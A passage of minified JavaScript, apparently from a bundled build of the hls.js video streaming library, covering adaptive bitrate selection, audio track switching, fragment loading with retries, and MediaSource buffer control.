r=t.stats,i=t.frag;if(!0!==r.aborted&&"main"===i.type&&e.isFinite(i.sn)&&(!i.bitrateTest||r.tload===r.tbuffered)){var n=r.tparsed-r.trequest;l.logger.log("latency/loading/parsing/append/kbps:"+Math.round(r.tfirst-r.trequest)+"/"+Math.round(r.tload-r.tfirst)+"/"+Math.round(r.tparsed-r.tload)+"/"+Math.round(r.tbuffered-r.tparsed)+"/"+Math.round(8*r.loaded/(r.tbuffered-r.trequest))),this._bwEstimator.sample(n,r.loaded),r.bwEstimate=this._bwEstimator.getEstimate(),i.bitrateTest?this.bitrateTestDelay=n/1e3:this.bitrateTestDelay=0}},r.prototype.onError=function(e){switch(e.details){case u.ErrorDetails.FRAG_LOAD_ERROR:case u.ErrorDetails.FRAG_LOAD_TIMEOUT:this.clearTimer()}},r.prototype.clearTimer=function(){clearInterval(this.timer),this.timer=null},Object.defineProperty(r.prototype,"nextAutoLevel",{get:function(){var e=this._nextAutoLevel,t=this._bwEstimator;if(!(-1===e||t&&t.canEstimate()))return e;var r=this._nextABRAutoLevel;return-1!==e&&(r=Math.min(e,r)),r},set:function(e){this._nextAutoLevel=e},enumerable:!0,configurable:!0}),Object.defineProperty(r.prototype,"_nextABRAutoLevel",{get:function(){var e=this.hls,t=e.maxAutoLevel,r=e.levels,i=e.config,n=e.minAutoLevel,a=e.media,s=this.lastLoadedFragLevel,u=this.fragCurrent?this.fragCurrent.duration:0,c=a?a.currentTime:0,d=a&&0!==a.playbackRate?Math.abs(a.playbackRate):1,f=this._bwEstimator?this._bwEstimator.getEstimate():i.abrEwmaDefaultEstimate,h=(o.BufferHelper.bufferInfo(a,c,i.maxBufferHole).end-c)/d,p=this._findBestLevel(s,u,f,n,t,h,i.abrBandWidthFactor,i.abrBandWidthUpFactor,r);if(p>=0)return p;l.logger.trace("rebuffering expected to happen, lets try to find a quality level minimizing the rebuffering");var g=u?Math.min(u,i.maxStarvationDelay):i.maxStarvationDelay,y=i.abrBandWidthFactor,v=i.abrBandWidthUpFactor;if(0===h){var m=this.bitrateTestDelay;if(m)g=(u?Math.min(u,i.maxLoadingDelay):i.maxLoadingDelay)-m,l.logger.trace("bitrate test took "+Math.round(1e3*m)+"ms, set first fragment max fetchDuration to "+Math.round(1e3*g)+" ms"),y=v=1}return p=this._findBestLevel(s,u,f,n,t,h+g,y,v,r),Math.max(p,0)},enumerable:!0,configurable:!0}),r.prototype._findBestLevel=function(e,t,r,i,n,a,s,o,u){for(var c=n;c>=i;c--){var d=u[c];if(d){var f=d.details,h=f?f.totalduration/f.fragments.length:t,p=!!f&&f.live,g=void 0;g=c<=e?s*r:o*r;var y=u[c].realBitrate?Math.max(u[c].realBitrate,u[c].bitrate):u[c].bitrate,v=y*h/g;if(l.logger.trace("level/adjustedbw/bitrate/avgDuration/maxFetchDuration/fetchDuration: "+c+"/"+Math.round(g)+"/"+y+"/"+h+"/"+a+"/"+v),g>y&&(!v||p&&!this.bitrateTestDelay||v<a))return c}}return-1},r}(s.default);t.default=f}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/audio-stream-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/utils/binary-search.js"),s=r("./src/utils/buffer-helper.js"),o=r("./src/demux/demuxer.js"),u=r("./src/events.js"),l=r("./src/controller/level-helper.js"),c=r("./src/utils/time-ranges.js"),d=r("./src/errors.js"),f=r("./src/utils/logger.js"),h=r("./src/utils/discontinuities.js"),p=r("./src/controller/fragment-tracker.js"),g=r("./src/loader/fragment.js"),y=r("./src/controller/base-stream-controller.js"),v=window.performance,m=function(t){function r(e,r){var i=t.call(this,e,u.default.MEDIA_ATTACHED,u.default.MEDIA_DETACHING,u.default.AUDIO_TRACKS_UPDATED,u.default.AUDIO_TRACK_SWITCHING,u.default.AUDIO_TRACK_LOADED,u.default.KEY_LOADED,u.default.FRAG_LOADED,u.default.FRAG_PARSING_INIT_SEGMENT,u.default.FRAG_PARSING_DATA,u.default.FRAG_PARSED,u.default.ERROR,u.default.BUFFER_RESET,u.default.BUFFER_CREATED,u.default.BUFFER_APPENDED,u.default.BUFFER_FLUSHED,u.default.INIT_PTS_FOUND)||this;return i.fragmentTracker=r,i.config=e.config,i.audioCodecSwap=!1,i._state=y.State.STOPPED,i.initPTS=[],i.waitingFragment=null,i.videoTrackCC=null,i}return n(r,t),r.prototype.onInitPtsFound=function(e){var t=e.id,r=e.frag.cc,i=e.initPTS;"main"===t&&(this.initPTS[r]=i,this.videoTrackCC=r,f.logger.log("InitPTS for cc: "+r+" found from video track: "+i),this.state===y.State.WAITING_INIT_PTS&&this.tick())},r.prototype.startLoad=function(e){if(this.tracks){var t=this.lastCurrentTime;this.stopLoad(),this.setInterval(100),this.fragLoadError=0,t>0&&-1===e?(f.logger.log("audio:override startPosition with lastCurrentTime @"+t.toFixed(3)),this.state=y.State.IDLE):(this.lastCurrentTime=this.startPosition?this.startPosition:e,this.state=y.State.STARTING),this.nextLoadPosition=this.startPosition=this.lastCurrentTime,this.tick()}else this.startPosition=e,this.state=y.State.STOPPED},Object.defineProperty(r.prototype,"state",{get:function(){return this._state},set:function(e){if(this.state!==e){var t=this.state;this._state=e,f.logger.log("audio stream:"+t+"->"+e)}},enumerable:!0,configurable:!0}),r.prototype.doTick=function(){var t,r,i,n=this.hls,o=n.config;switch(this.state){case y.State.ERROR:case y.State.PAUSED:case y.State.BUFFER_FLUSHING:break;case y.State.STARTING:this.state=y.State.WAITING_TRACK,this.loadedmetadata=!1;break;case y.State.IDLE:var l=this.tracks;if(!l)break;if(!this.media&&(this.startFragRequested||!o.startFragPrefetch))break;if(this.loadedmetadata)t=this.media.currentTime;else if(void 0===(t=this.nextLoadPosition))break;var c=this.mediaBuffer?this.mediaBuffer:this.media,d=this.videoBuffer?this.videoBuffer:this.media,g=s.BufferHelper.bufferInfo(c,t,o.maxBufferHole),m=s.BufferHelper.bufferInfo(d,t,o.maxBufferHole),L=g.len,M=g.end,T=this.fragPrevious,A=Math.min(o.maxBufferLength,o.maxMaxBufferLength),w=Math.max(A,m.len),E=this.audioSwitch,S=this.trackId;if((L<w||E)&&S<l.length){if(void 0===(i=l[S].details)){this.state=y.State.WAITING_TRACK;break}if(!E&&this._streamEnded(g,i))return this.hls.trigger(u.default.BUFFER_EOS,{type:"audio"}),void(this.state=y.State.ENDED);var D=i.fragments,b=D.length,j=D[0].start,C=D[b-1].start+D[b-1].duration,I=void 0;if(E)if(i.live&&!i.PTSKnown)f.logger.log("switching audiotrack, live stream, unknown PTS,load first fragment"),M=0;else if(M=t,i.PTSKnown&&t<j){if(!(g.end>j||g.nextStart))return;f.logger.log("alt audio track ahead of main track, seek to start of alt audio track"),this.media.currentTime=j+.05}if(i.initSegment&&!i.initSegment.data)I=i.initSegment;else if(M<=j){if(I=D[0],null!==this.videoTrackCC&&I.cc!==this.videoTrackCC&&(I=h.findFragWithCC(D,this.videoTrackCC)),i.live&&I.loadIdx&&I.loadIdx===this.fragLoadIdx){var x=g.nextStart?g.nextStart:j;return f.logger.log("no alt audio available @currentTime:"+this.media.currentTime+", seeking @"+(x+.05)),void(this.media.currentTime=x+.05)}}else{var N=void 0,_=o.maxFragLookUpTolerance,O=T?D[T.sn-D[0].sn+1]:void 0,k=function(e){var t=Math.min(_,e.duration);return e.start+e.duration-t<=M?1:e.start-t>M&&e.start?-1:0};M<C?(M>C-_&&(_=0),N=O&&!k(O)?O:a.default.search(D,k)):N=D[b-1],N&&(I=N,j=N.start,T&&I.level===T.level&&I.sn===T.sn&&(I.sn<i.endSN?(I=D[I.sn+1-i.startSN],f.logger.log("SN just loaded, load next one: "+I.sn)):I=null))}I&&(I.encrypted?(f.logger.log("Loading key for "+I.sn+" of ["+i.startSN+" ,"+i.endSN+"],track "+S),this.state=y.State.KEY_LOADING,n.trigger(u.default.KEY_LOADING,{frag:I})):(f.logger.log("Loading "+I.sn+", cc: "+I.cc+" of ["+i.startSN+" ,"+i.endSN+"],track "+S+", currentTime:"+t+",bufferEnd:"+M.toFixed(3)),this.fragCurrent=I,(E||this.fragmentTracker.getState(I)===p.FragmentState.NOT_LOADED)&&(this.startFragRequested=!0,e.isFinite(I.sn)&&(this.nextLoadPosition=I.start+I.duration),n.trigger(u.default.FRAG_LOADING,{frag:I}),this.state=y.State.FRAG_LOADING)))}break;case y.State.WAITING_TRACK:(r=this.tracks[this.trackId])&&r.details&&(this.state=y.State.IDLE);break;case y.State.FRAG_LOADING_WAITING_RETRY:var R=v.now(),P=this.retryDate,F=(c=this.media)&&c.seeking;(!P||R>=P||F)&&(f.logger.log("audioStreamController: retryDate reached, switch back to IDLE state"),this.state=y.State.IDLE);break;case y.State.WAITING_INIT_PTS:var B=this.videoTrackCC;if(void 0===this.initPTS[B])break;var U=this.waitingFragment;if(U){var z=U.frag.cc;B!==z?(r=this.tracks[this.trackId]).details&&r.details.live&&(f.logger.warn("Waiting fragment CC ("+z+") does not match video track CC ("+B+")"),this.waitingFragment=null,this.state=y.State.IDLE):(this.state=y.State.FRAG_LOADING,this.onFragLoaded(this.waitingFragment),this.waitingFragment=null)}else this.state=y.State.IDLE;break;case y.State.STOPPED:case y.State.FRAG_LOADING:case y.State.PARSING:case y.State.PARSED:case y.State.ENDED:}},r.prototype.onMediaAttached=function(e){var t=this.media=this.mediaBuffer=e.media;this.onvseeking=this.onMediaSeeking.bind(this),this.onvended=this.onMediaEnded.bind(this),t.addEventListener("seeking",this.onvseeking),t.addEventListener("ended",this.onvended);var r=this.config;this.tracks&&r.autoStartLoad&&this.startLoad(r.startPosition)},r.prototype.onMediaDetaching=function(){var e=this.media;e&&e.ended&&(f.logger.log("MSE detaching and video ended, reset startPosition"),this.startPosition=this.lastCurrentTime=0),e&&(e.removeEventListener("seeking",this.onvseeking),e.removeEventListener("ended",this.onvended),this.onvseeking=this.onvseeked=this.onvended=null),this.media=this.mediaBuffer=this.videoBuffer=null,this.loadedmetadata=!1,this.stopLoad()},r.prototype.onAudioTracksUpdated=function(e){f.logger.log("audio tracks updated"),this.tracks=e.audioTracks},r.prototype.onAudioTrackSwitching=function(e){var t=!!e.url;this.trackId=e.id,this.fragCurrent=null,this.state=y.State.PAUSED,this.waitingFragment=null,t?this.setInterval(100):this.demuxer&&(this.demuxer.destroy(),this.demuxer=null),t&&(this.audioSwitch=!0,this.state=y.State.IDLE),this.tick()},r.prototype.onAudioTrackLoaded=function(t){var r=t.details,i=t.id,n=this.tracks[i],a=r.totalduration,s=0;if(f.logger.log("track "+i+" loaded ["+r.startSN+","+r.endSN+"],duration:"+a),r.live){var o=n.details;o&&r.fragments.length>0?(l.mergeDetails(o,r),s=r.fragments[0].start,r.PTSKnown?f.logger.log("live audio playlist sliding:"+s.toFixed(3)):f.logger.log("live audio playlist - outdated PTS, unknown sliding")):(r.PTSKnown=!1,f.logger.log("live audio playlist - first load, unknown sliding"))}else r.PTSKnown=!1;if(n.details=r,!this.startFragRequested){if(-1===this.startPosition){var u=r.startTimeOffset;e.isFinite(u)?(f.logger.log("start time offset found in playlist, adjust startPosition to "+u),this.startPosition=u):this.startPosition=0}this.nextLoadPosition=this.startPosition}this.state===y.State.WAITING_TRACK&&(this.state=y.State.IDLE),this.tick()},r.prototype.onKeyLoaded=function(){this.state===y.State.KEY_LOADING&&(this.state=y.State.IDLE,this.tick())},r.prototype.onFragLoaded=function(e){var t=this.fragCurrent,r=e.frag;if(this.state===y.State.FRAG_LOADING&&t&&"audio"===r.type&&r.level===t.level&&r.sn===t.sn){var i=this.tracks[this.trackId],n=i.details,a=n.totalduration,s=t.level,l=t.sn,c=t.cc,d=this.config.defaultAudioCodec||i.audioCodec||"mp4a.40.2",h=this.stats=e.stats;if("initSegment"===l)this.state=y.State.IDLE,h.tparsed=h.tbuffered=v.now(),n.initSegment.data=e.payload,this.hls.trigger(u.default.FRAG_BUFFERED,{stats:h,frag:t,id:"audio"}),this.tick();else{this.state=y.State.PARSING,this.appended=!1,this.demuxer||(this.demuxer=new o.default(this.hls,"audio"));var p=this.initPTS[c],g=n.initSegment?n.initSegment.data:[];if(n.initSegment||void 0!==p){this.pendingBuffering=!0,f.logger.log("Demuxing "+l+" of ["+n.startSN+" ,"+n.endSN+"],track "+s);this.demuxer.push(e.payload,g,d,null,t,a,!1,p)}else f.logger.log("unknown video PTS for continuity counter "+c+", waiting for video PTS before demuxing audio frag "+l+" of ["+n.startSN+" ,"+n.endSN+"],track "+s),this.waitingFragment=e,this.state=y.State.WAITING_INIT_PTS}}this.fragLoadError=0},r.prototype.onFragParsingInitSegment=function(e){var t=this.fragCurrent,r=e.frag;if(t&&"audio"===e.id&&r.sn===t.sn&&r.level===t.level&&this.state===y.State.PARSING){var i=e.tracks,n=void 0;if(i.video&&delete i.video,n=i.audio){n.levelCodec=n.codec,n.id=e.id,this.hls.trigger(u.default.BUFFER_CODECS,i),f.logger.log("audio track:audio,container:"+n.container+",codecs[level/parsed]=["+n.levelCodec+"/"+n.codec+"]");var a=n.initSegment;if(a){var s={type:"audio",data:a,parent:"audio",content:"initSegment"};this.audioSwitch?this.pendingData=[s]:(this.appended=!0,this.pendingBuffering=!0,this.hls.trigger(u.default.BUFFER_APPENDING,s))}this.tick()}}},r.prototype.onFragParsingData=function(t){var r=this,i=this.fragCurrent,n=t.frag;if(i&&"audio"===t.id&&"audio"===t.type&&n.sn===i.sn&&n.level===i.level&&this.state===y.State.PARSING){var a=this.trackId,s=this.tracks[a],o=this.hls;e.isFinite(t.endPTS)||(t.endPTS=t.startPTS+i.duration,t.endDTS=t.startDTS+i.duration),i.addElementaryStream(g.default.ElementaryStreamTypes.AUDIO),f.logger.log("parsed "+t.type+",PTS:["+t.startPTS.toFixed(3)+","+t.endPTS.toFixed(3)+"],DTS:["+t.startDTS.toFixed(3)+"/"+t.endDTS.toFixed(3)+"],nb:"+t.nb),l.updateFragPTSDTS(s.details,i,t.startPTS,t.endPTS);var c=this.audioSwitch,h=this.media,p=!1;if(c&&h)if(h.readyState){var v=h.currentTime;f.logger.log("switching audio track : currentTime:"+v),v>=t.startPTS&&(f.logger.log("switching audio track : flushing all audio"),this.state=y.State.BUFFER_FLUSHING,o.trigger(u.default.BUFFER_FLUSHING,{startOffset:0,endOffset:e.POSITIVE_INFINITY,type:"audio"}),p=!0,this.audioSwitch=!1,o.trigger(u.default.AUDIO_TRACK_SWITCHED,{id:a}))}else this.audioSwitch=!1,o.trigger(u.default.AUDIO_TRACK_SWITCHED,{id:a});var m=this.pendingData;if(!m)return f.logger.warn("Apparently attempt to enqueue media payload without codec initialization data upfront"),void o.trigger(u.default.ERROR,{type:d.ErrorTypes.MEDIA_ERROR,details:null,fatal:!0});this.audioSwitch||([t.data1,t.data2].forEach(function(e){e&&e.length&&m.push({type:t.type,data:e,parent:"audio",content:"data"})}),!p&&m.length&&(m.forEach(function(e){r.state===y.State.PARSING&&(r.pendingBuffering=!0,r.hls.trigger(u.default.BUFFER_APPENDING,e))}),this.pendingData=[],this.appended=!0)),this.tick()}},r.prototype.onFragParsed=function(e){var t=this.fragCurrent,r=e.frag;t&&"audio"===e.id&&r.sn===t.sn&&r.level===t.level&&this.state===y.State.PARSING&&(this.stats.tparsed=v.now(),this.state=y.State.PARSED,this._checkAppendedParsed())},r.prototype.onBufferReset=function(){this.mediaBuffer=this.videoBuffer=null,this.loadedmetadata=!1},r.prototype.onBufferCreated=function(e){var t=e.tracks.audio;t&&(this.mediaBuffer=t.buffer,this.loadedmetadata=!0),e.tracks.video&&(this.videoBuffer=e.tracks.video.buffer)},r.prototype.onBufferAppended=function(e){if("audio"===e.parent){var t=this.state;t!==y.State.PARSING&&t!==y.State.PARSED||(this.pendingBuffering=e.pending>0,this._checkAppendedParsed())}},r.prototype._checkAppendedParsed=function(){if(!(this.state!==y.State.PARSED||this.appended&&this.pendingBuffering)){var e=this.fragCurrent,t=this.stats,r=this.hls;if(e){this.fragPrevious=e,t.tbuffered=v.now(),r.trigger(u.default.FRAG_BUFFERED,{stats:t,frag:e,id:"audio"});var i=this.mediaBuffer?this.mediaBuffer:this.media;f.logger.log("audio buffered : "+c.default.toString(i.buffered)),this.audioSwitch&&this.appended&&(this.audioSwitch=!1,r.trigger(u.default.AUDIO_TRACK_SWITCHED,{id:this.trackId})),this.state=y.State.IDLE}this.tick()}},r.prototype.onError=function(t){var r=t.frag;if(!r||"audio"===r.type)switch(t.details){case d.ErrorDetails.FRAG_LOAD_ERROR:case d.ErrorDetails.FRAG_LOAD_TIMEOUT:var i=t.frag;if(i&&"audio"!==i.type)break;if(!t.fatal){var n=this.fragLoadError;if(n?n++:n=1,n<=(o=this.config).fragLoadingMaxRetry){this.fragLoadError=n;var a=Math.min(Math.pow(2,n-1)*o.fragLoadingRetryDelay,o.fragLoadingMaxRetryTimeout);f.logger.warn("AudioStreamController: frag loading failed, retry in "+a+" ms"),this.retryDate=v.now()+a,this.state=y.State.FRAG_LOADING_WAITING_RETRY}else f.logger.error("AudioStreamController: "+t.details+" reaches max retry, redispatch as fatal ..."),t.fatal=!0,this.state=y.State.ERROR}break;case d.ErrorDetails.AUDIO_TRACK_LOAD_ERROR:case d.ErrorDetails.AUDIO_TRACK_LOAD_TIMEOUT:case d.ErrorDetails.KEY_LOAD_ERROR:case d.ErrorDetails.KEY_LOAD_TIMEOUT:this.state!==y.State.ERROR&&(this.state=t.fatal?y.State.ERROR:y.State.IDLE,f.logger.warn("AudioStreamController: "+t.details+" while loading frag, now switching to "+this.state+" state ..."));break;case d.ErrorDetails.BUFFER_FULL_ERROR:if("audio"===t.parent&&(this.state===y.State.PARSING||this.state===y.State.PARSED)){var o,l=this.mediaBuffer,c=this.media.currentTime;if(l&&s.BufferHelper.isBuffered(l,c)&&s.BufferHelper.isBuffered(l,c+.5))(o=this.config).maxMaxBufferLength>=o.maxBufferLength&&(o.maxMaxBufferLength/=2,f.logger.warn("AudioStreamController: reduce max buffer length to "+o.maxMaxBufferLength+"s")),this.state=y.State.IDLE;else f.logger.warn("AudioStreamController: buffer full error also media.currentTime is not buffered, flush audio buffer"),this.fragCurrent=null,this.state=y.State.BUFFER_FLUSHING,this.hls.trigger(u.default.BUFFER_FLUSHING,{startOffset:0,endOffset:e.POSITIVE_INFINITY,type:"audio"})}}},r.prototype.onBufferFlushed=function(){var e=this,t=this.pendingData;t&&t.length?(f.logger.log("AudioStreamController: appending pending audio data after buffer flushed"),t.forEach(function(t){e.hls.trigger(u.default.BUFFER_APPENDING,t)}),this.appended=!0,this.pendingData=[],this.state=y.State.PARSED):(this.state=y.State.IDLE,this.fragPrevious=null,this.tick())},r}(y.default);t.default=m}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/audio-track-controller.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/task-loop.js"),o=r("./src/utils/logger.js"),u=r("./src/errors.js"),l=function(e){function t(t){var r=e.call(this,t,a.default.MANIFEST_LOADING,a.default.MANIFEST_PARSED,a.default.AUDIO_TRACK_LOADED,a.default.AUDIO_TRACK_SWITCHED,a.default.LEVEL_LOADED,a.default.ERROR)||this;return r._trackId=-1,r._selectDefaultTrack=!0,r.tracks=[],r.trackIdBlacklist=Object.create(null),r.audioGroupId=null,r}return n(t,e),t.prototype.onManifestLoading=function(){this.tracks=[],this._trackId=-1,this._selectDefaultTrack=!0},t.prototype.onManifestParsed=function(e){var t=this.tracks=e.audioTracks||[];this.hls.trigger(a.default.AUDIO_TRACKS_UPDATED,{audioTracks:t})},t.prototype.onAudioTrackLoaded=function(e){if(e.id>=this.tracks.length)o.logger.warn("Invalid audio track id:",e.id);else{if(o.logger.log("audioTrack "+e.id+" loaded"),this.tracks[e.id].details=e.details,e.details.live&&!this.hasInterval()){var t=1e3*e.details.targetduration;this.setInterval(t)}!e.details.live&&this.hasInterval()&&this.clearInterval()}},t.prototype.onAudioTrackSwitched=function(e){var t=this.tracks[e.id].groupId;t&&this.audioGroupId!==t&&(this.audioGroupId=t)},t.prototype.onLevelLoaded=function(e){var t=this.hls.levels[e.level];if(t.audioGroupIds){var r=t.audioGroupIds[t.urlId];this.audioGroupId!==r&&(this.audioGroupId=r,this._selectInitialAudioTrack())}},t.prototype.onError=function(e){e.type===u.ErrorTypes.NETWORK_ERROR&&(e.fatal&&this.clearInterval(),e.details===u.ErrorDetails.AUDIO_TRACK_LOAD_ERROR&&(o.logger.warn("Network failure on audio-track id:",e.context.id),this._handleLoadError()))},Object.defineProperty(t.prototype,"audioTracks",{get:function(){return this.tracks},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"audioTrack",{get:function(){return this._trackId},set:function(e){this._setAudioTrack(e),this._selectDefaultTrack=!1},enumerable:!0,configurable:!0}),t.prototype._setAudioTrack=function(e){if(this._trackId===e&&this.tracks[this._trackId].details)o.logger.debug("Same id as current audio-track passed, and track details available -> no-op");else if(e<0||e>=this.tracks.length)o.logger.warn("Invalid id passed to audio-track controller");else{var t=this.tracks[e];o.logger.log("Now switching to audio-track index "+e),this.clearInterval(),this._trackId=e;var r=t.url,i=t.type,n=t.id;this.hls.trigger(a.default.AUDIO_TRACK_SWITCHING,{id:n,type:i,url:r}),this._loadTrackDetailsIfNeeded(t)}},t.prototype.doTick=function(){this._updateTrack(this._trackId)},t.prototype._selectInitialAudioTrack=function(){var e=this,t=this.tracks;if(t.length){var r=this.tracks[this._trackId],i=null;if(r&&(i=r.name),this._selectDefaultTrack){var n=t.filter(function(e){return e.default});n.length?t=n:o.logger.warn("No default audio tracks defined")}var s=!1,l=function(){t.forEach(function(t){s||e.audioGroupId&&t.groupId!==e.audioGroupId||i&&i!==t.name||(e._setAudioTrack(t.id),s=!0)})};l(),s||(i=null,l()),s||(o.logger.error("No track found for running audio group-ID: "+this.audioGroupId),this.hls.trigger(a.default.ERROR,{type:u.ErrorTypes.MEDIA_ERROR,details:u.ErrorDetails.AUDIO_TRACK_LOAD_ERROR,fatal:!0}))}},t.prototype._needsTrackLoading=function(e){var t=e.details,r=e.url;return!(t&&!t.live)&&!!r},t.prototype._loadTrackDetailsIfNeeded=function(e){if(this._needsTrackLoading(e)){var t=e.url,r=e.id;o.logger.log("loading audio-track playlist for id: "+r),this.hls.trigger(a.default.AUDIO_TRACK_LOADING,{url:t,id:r})}},t.prototype._updateTrack=function(e){if(!(e<0||e>=this.tracks.length)){this.clearInterval(),this._trackId=e,o.logger.log("trying to update audio-track "+e);var t=this.tracks[e];this._loadTrackDetailsIfNeeded(t)}},t.prototype._handleLoadError=function(){this.trackIdBlacklist[this._trackId]=!0;var e=this._trackId,t=this.tracks[e],r=t.name,i=t.language,n=t.groupId;o.logger.warn("Loading failed on audio track id: "+e+", group-id: "+n+', name/language: "'+r+'" / "'+i+'"');for(var a=e,s=0;s<this.tracks.length;s++){if(!this.trackIdBlacklist[s])if(this.tracks[s].name===r){a=s;break}}a!==e?(o.logger.log("Attempting audio-track fallback id:",a,"group-id:",this.tracks[a].groupId),this._setAudioTrack(a)):o.logger.warn('No fallback audio-track found for name/language: "'+r+'" / "'+i+'"')},t}(s.default);t.default=l},"./src/controller/base-stream-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/task-loop.js"),s=r("./src/controller/fragment-tracker.js"),o=r("./src/utils/buffer-helper.js"),u=r("./src/utils/logger.js");t.State={STOPPED:"STOPPED",STARTING:"STARTING",IDLE:"IDLE",PAUSED:"PAUSED",KEY_LOADING:"KEY_LOADING",FRAG_LOADING:"FRAG_LOADING",FRAG_LOADING_WAITING_RETRY:"FRAG_LOADING_WAITING_RETRY",WAITING_TRACK:"WAITING_TRACK",PARSING:"PARSING",PARSED:"PARSED",BUFFER_FLUSHING:"BUFFER_FLUSHING",ENDED:"ENDED",ERROR:"ERROR",WAITING_INIT_PTS:"WAITING_INIT_PTS",WAITING_LEVEL:"WAITING_LEVEL"};var l=function(r){function i(){return null!==r&&r.apply(this,arguments)||this}return n(i,r),i.prototype.doTick=function(){},i.prototype.startLoad=function(){},i.prototype.stopLoad=function(){var e=this.fragCurrent;e&&(e.loader&&e.loader.abort(),this.fragmentTracker.removeFragment(e)),this.demuxer&&(this.demuxer.destroy(),this.demuxer=null),this.fragCurrent=null,this.fragPrevious=null,this.clearInterval(),this.clearNextTick(),this.state=t.State.STOPPED},i.prototype._streamEnded=function(e,t){var r=this.fragCurrent,i=this.fragmentTracker;if(!t.live&&r&&!r.backtracked&&r.sn===t.endSN&&!e.nextStart){var n=i.getState(r);return n===s.FragmentState.PARTIAL||n===s.FragmentState.OK}return!1},i.prototype.onMediaSeeking=function(){var r=this.config,i=this.media,n=this.mediaBuffer,a=this.state,s=i?i.currentTime:null,l=o.BufferHelper.bufferInfo(n||i,s,this.config.maxBufferHole);if(e.isFinite(s)&&u.logger.log("media seeking to "+s.toFixed(3)),a===t.State.FRAG_LOADING){var c=this.fragCurrent;if(0===l.len&&c){var d=r.maxFragLookUpTolerance,f=c.start-d,h=c.start+c.duration+d;s<f||s>h?(c.loader&&(u.logger.log("seeking outside of buffer while fragment load in progress, cancel fragment load"),c.loader.abort()),this.fragCurrent=null,this.fragPrevious=null,this.state=t.State.IDLE):u.logger.log("seeking outside of buffer but within currently loaded fragment range")}}else a===t.State.ENDED&&(0===l.len&&(this.fragPrevious=null,this.fragCurrent=null),this.state=t.State.IDLE);i&&(this.lastCurrentTime=s),this.loadedmetadata||(this.nextLoadPosition=this.startPosition=s),this.tick()},i.prototype.onMediaEnded=function(){this.startPosition=this.lastCurrentTime=0},i.prototype.onHandlerDestroying=function(){this.stopLoad(),r.prototype.onHandlerDestroying.call(this)},i.prototype.onHandlerDestroyed=function(){this.state=t.State.STOPPED,this.fragmentTracker=null},i}(a.default);t.default=l}).call(this,r("./src/polyfills/number.js").Number)},"./src/controller/buffer-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/utils/logger.js"),u=r("./src/errors.js"),l=r("./src/utils/mediasource-helper.js").getMediaSource(),c=function(t){function r(e){var r=t.call(this,e,a.default.MEDIA_ATTACHING,a.default.MEDIA_DETACHING,a.default.MANIFEST_PARSED,a.default.BUFFER_RESET,a.default.BUFFER_APPENDING,a.default.BUFFER_CODECS,a.default.BUFFER_EOS,a.default.BUFFER_FLUSHING,a.default.LEVEL_PTS_UPDATED,a.default.LEVEL_UPDATED)||this;return r._msDuration=null,r._levelDuration=null,r._levelTargetDuration=10,r._live=null,r._objectUrl=null,r.bufferCodecEventsExpected=0,r.onsbue=r.onSBUpdateEnd.bind(r),r.onsbe=r.onSBUpdateError.bind(r),r.pendingTracks={},r.tracks={},r}return n(r,t),r.prototype.destroy=function(){s.default.prototype.destroy.call(this)},r.prototype.onLevelPtsUpdated=function(e){var t=e.type,r=this.tracks.audio;if("audio"===t&&r&&"audio/mpeg"===r.container){var i=this.sourceBuffer.audio;if(Math.abs(i.timestampOffset-e.start)>.1){var n=i.updating;try{i.abort()}catch(e){o.logger.warn("can not abort audio buffer: "+e)}n?this.audioTimestampOffset=e.start:(o.logger.warn("change mpeg audio timestamp offset from "+i.timestampOffset+" to "+e.start),i.timestampOffset=e.start)}}},r.prototype.onManifestParsed=function(e){this.bufferCodecEventsExpected=e.altAudio?2:1,o.logger.log(this.bufferCodecEventsExpected+" bufferCodec event(s) expected")},r.prototype.onMediaAttaching=function(e){var t=this.media=e.media;if(t){var r=this.mediaSource=new l;this.onmso=this.onMediaSourceOpen.bind(this),this.onmse=this.onMediaSourceEnded.bind(this),this.onmsc=this.onMediaSourceClose.bind(this),r.addEventListener("sourceopen",this.onmso),r.addEventListener("sourceended",this.onmse),r.addEventListener("sourceclose",this.onmsc),t.src=window.URL.createObjectURL(r),this._objectUrl=t.src}},r.prototype.onMediaDetaching=function(){o.logger.log("media source detaching");var e=this.mediaSource;if(e){if("open"===e.readyState)try{e.endOfStream()}catch(e){o.logger.warn("onMediaDetaching:"+e.message+" while calling endOfStream")}e.removeEventListener("sourceopen",this.onmso),e.removeEventListener("sourceended",this.onmse),e.removeEventListener("sourceclose",this.onmsc),this.media&&(window.URL.revokeObjectURL(this._objectUrl),this.media.src===this._objectUrl?(this.media.removeAttribute("src"),this.media.load()):o.logger.warn("media.src was changed by a third party - skip 